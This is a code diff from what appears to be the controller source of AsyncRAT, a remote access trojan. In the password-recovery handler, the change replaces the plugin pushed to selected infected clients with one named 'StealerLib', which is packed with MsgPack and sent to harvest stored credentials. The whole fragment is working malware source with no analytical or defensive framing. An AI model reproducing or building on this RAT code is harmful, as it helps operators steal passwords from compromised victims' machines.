@@ -731,7 +731,7 @@ namespace AsyncRAT_Sharp
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
-                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.RecoveryPlugin);
+                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.StealerLib);
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
